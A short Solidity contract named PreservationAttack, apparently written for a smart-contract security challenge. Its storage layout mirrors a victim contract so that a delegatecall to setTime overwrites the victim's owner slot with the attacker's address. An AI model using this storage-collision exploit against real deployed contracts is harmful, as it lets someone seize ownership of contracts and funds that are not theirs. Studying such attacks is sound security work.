contract PreservationAttack {

  uint storedTime;  
  uint not_important;
  address owner;

  function setTime(uint _time) public {
    storedTime = _time;
    owner = msg.sender;
  }
}
